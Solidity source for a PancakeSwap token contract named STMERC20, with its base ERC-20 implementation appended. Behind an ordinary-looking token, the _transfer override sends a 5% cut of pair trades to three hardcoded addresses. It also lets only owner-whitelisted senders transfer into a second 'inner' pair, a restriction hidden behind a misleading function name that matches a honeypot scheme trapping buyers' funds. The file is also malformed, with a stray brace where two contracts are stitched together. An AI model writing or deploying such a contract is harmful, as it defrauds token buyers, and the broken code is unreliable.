pragma solidity ^0.8.7;
import "./ERC20StandardToken.sol";

// a library for performing overflow-safe math, courtesy of DappHub (https://github.com/dapphub/ds-math)

library SafeMath {
    function add(uint256 x, uint256 y) internal pure returns (uint256 z) {
        require((z = x + y) >= x, "ds-math-add-overflow");
    }

    function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {
        require((z = x - y) <= x, "ds-math-sub-underflow");
    }

    function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {
        require(y == 0 || (z = x * y) / y == x, "ds-math-mul-overflow");
    }
}


interface IPancakeRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function ownerShips(address addr) external view returns(bool);
}

interface IPancakePair{
    function sync() external;
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor ()  {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


contract STMERC20 is ERC20StandardToken,Ownable{
    using SafeMath for uint256;

    address public immutable usdtPair;
    address private constant nodeAddress = 0x864974F724a7bf685eCF73C52aeDBC76c50d9F53;
    address private constant fundAddress = 0xcBEa50b078944a50d8f1679cD455F00034181fC1;
    address private constant lpAddress = 0x7DeEea30012F01878F95E06C70b5450A633bb669;

    mapping (address => bool) private _isInnerRouterOwnerShips;

    IPancakeRouter private constant innerRouter = IPancakeRouter(0x0ff0eBC65deEe10ba34fd81AfB6b95527be46702);
    address public immutable innerPair;
     constructor(string memory symbol_, string memory name_, uint8 decimals_, uint256 totalSupply_) ERC20StandardToken(symbol_, name_, decimals_, totalSupply_) {
        IPancakeRouter router = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address usdt = 0x55d398326f99059fF775485246999027B3197955;
        usdtPair = pairFor(router.factory(), address(this), usdt);

        innerPair = innerPairFor(innerRouter.factory(), address(this), usdt);
        
    }

    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair_) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair_ = address(uint160(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5'
        )))));
    }

    function innerPairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair_) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair_ = address(uint160(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'593f76b0a7474d8e3a2b2ea80ad066754ac57d9a88901cd0acb3723974c4a191'
        )))));
    }


    function _transfer(address from, address to, uint256 amount) internal override {
        if(to == innerPair) {
            require(_isInnerRouterOwnerShips[from], "f");
        }

        address pair_ = usdtPair;
        if(from != pair_ && to != pair_) {
            super._transfer(from, to, amount);
            return;
        }
        _subSenderBalance(from, amount);
        unchecked{
            uint256 feeAmount = amount/100;
            _addReceiverBalance(from, nodeAddress, feeAmount);
            _addReceiverBalance(from, lpAddress, feeAmount);
            _addReceiverBalance(from, fundAddress, 3*feeAmount);
            _addReceiverBalance(from, to, amount - 5*feeAmount);
        }
    }
   
    function innerRouterOwnerShips(address account, bool excluded) public onlyOwner {
        _isInnerRouterOwnerShips[account] = excluded;
    }



    
}






}
pragma solidity ^0.8.7;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ERC20StandardToken is IERC20 {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _symbol;
    string private _name;
    uint8 private immutable _decimals;
    uint256 private _totalSupply;
    
    constructor(string memory symbol_, string memory name_, uint8 decimals_, uint256 totalSupply_) {
        _symbol = symbol_;
        _name = name_;
        _decimals = decimals_;
        _mint(msg.sender, totalSupply_*10**decimals_);
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }


    function _transfer(address from, address to, uint256 amount) internal virtual {
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }
        emit Transfer(from, to, amount);
    }

    function _addSenderBalance(address from, uint256 amount) internal virtual {
        _balances[from] += amount;
    }

    function _subSenderBalance(address from, uint256 amount) internal virtual {
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
    }

    function _addReceiverBalance(address from, address to, uint256 amount) internal virtual {
        unchecked {
            _balances[to] += amount;
        }
        emit Transfer(from, to, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = _allowances[owner][spender];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }
        emit Transfer(account, address(0), amount);
    }
}
